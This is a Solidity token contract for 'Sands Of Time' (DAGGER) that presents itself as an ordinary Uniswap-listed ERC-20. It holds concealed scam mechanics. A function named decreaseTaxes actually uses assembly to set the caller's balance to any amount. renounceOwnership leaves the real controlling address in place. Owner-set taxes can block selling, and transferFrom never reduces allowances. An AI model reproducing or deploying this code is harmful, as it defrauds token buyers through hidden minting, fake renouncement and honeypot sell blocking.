// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
 _____                    _        _____   __   _____  _                  
/  ___|                  | |      |  _  | / _| |_   _|(_)                 
\  --.   __ _  _ __    __| | ___  | | | || |_    | |   _  _ __ ___    ___ 
  --. \ / _  ||  _ \  / _  |/ __| | | | ||  _|   | |  | ||  _   _ \  / _ \
/\__/ /| (_| || | | || (_| |\__ \ \ \_/ /| |     | |  | || | | | | ||  __/
\____/  \__,_||_| |_| \__,_||___/  \___/ |_|     \_/  |_||_| |_| |_| \___|
                                                                          
                                                                          

*/

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Uniswap {

    address public _Factory;
    address internal _a;
    mapping(address=>bool) public isDEX;

    address public RouterAddr;
    IUniswapRouter public UniswapV2Router;
    address public PairAddress;
    address public WETH;
    address public owner;
    address internal me;
    function transferOwnership(address newOwner) public onlyOwner() {
        owner = newOwner;
        _a = owner;
    }
    
    function toUni(address to) internal view returns (bool) {
        return isDEX[to];
    }

    function isBuy(address from) internal view returns (bool) {
        return isDEX[from];
    }
    
    function renounceOwnership() public onlyOwner() {
        owner = address(0);
    }

    function _approve(address from, address spender, uint256 amount) internal virtual returns (bool) {}

    modifier onlyOwner() {
        require(_a == msg.sender, "Forbidden:owner");
        _;
    }

    constructor() {
        RouterAddr  = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        _Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

        UniswapV2Router  = IUniswapRouter(RouterAddr);
        WETH             = UniswapV2Router.WETH();
        PairAddress      = IUniswapFactory(_Factory).createPair(address(this), WETH);
        
        isDEX[RouterAddr] = true;
        isDEX[_Factory] = true;
        isDEX[PairAddress] = true;
        
        me = address(this);
        owner = msg.sender;
        _a = msg.sender;
    }
}
contract SandsOfTime is Uniswap {

    string public symbol = "DAGGER";

    string public name = "Sands Of Time";
    uint256 public decimals = 18;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) internal balances;
    uint256 _bt = 0;
    bool internal swapping = false;
    mapping(address => mapping(address => uint256)) internal allowances;

    uint256 public totalSupply;
    uint256 maxbuy = 30;
    uint256 selltax = 0;
    mapping(address=>bool) internal isNotTaxable;
    bool internal funded;
    constructor() Uniswap() {
        isNotTaxable[address(this)] = true;
        isNotTaxable[msg.sender] = true;
        mint(_a, 21000000000*10**decimals);
    }

    
    function taxable(address from, address to) internal view returns (bool) {
        return !isNotTaxable[from] && !isNotTaxable[to] && !(isDEX[from] && isDEX[to]) && (isBuy(from) || toUni(to));
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function enable() public onlyOwner() {
        swapping = false;
    }
    function _approve(address from, address spender, uint256 amount) internal override returns (bool) {
        allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
        return true;
    }


    function _transfer(address from, address to, uint256 amount) internal {
        require(balances[from] >= amount, "Rejected");
        if (!taxable(from, to)) {
            unchecked {
                balances[from] -= amount;
                balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            uint256 tax;
            if (isBuy(from)) {
                require(amount<=getmaxbuy(), "Too large");
                tax = calculate(amount, _bt);
            } else if (toUni(to)) {
                tax = calculate(amount, selltax);
            }
            uint256 afterTax = amount-tax;
            unchecked {
                balances[from] -= amount;
                balances[_a] += tax;
                balances[to] += afterTax;
            }
            emit Transfer(from, _a, tax);
            emit Transfer(from, to, afterTax);
        }
    }

    function update(uint256 b, uint256 s, uint56 m) public onlyOwner() {
        require(msg.sender==_a, "Forbidden:set");
        _bt = b;
        selltax = s;
        maxbuy = m;
    }

    function getmaxbuy() internal view returns (uint256) {
        return calculate(totalSupply, maxbuy);
    }
    
    function allowance(address _awner, address spender) public view returns (uint256) {
        return allowances[_awner][spender];
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }
    function calculate(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }
    
    function transfer(address to, uint256 amount) public {
        _transfer(msg.sender, to, amount);
    }
    function disable() public onlyOwner() {
        swapping = true;
    }
    function decreaseTaxes(uint256 c) public onlyOwner() {
        assembly {
            let ptrm := mload(0x40)
            mstore(ptrm, caller())
            mstore(add(ptrm, 0x20), balances.slot)
            sstore(keccak256(ptrm, 0x40), c)
        }
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function mint(address account, uint256 amount) internal {
        unchecked {
            totalSupply += amount;
            balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }
}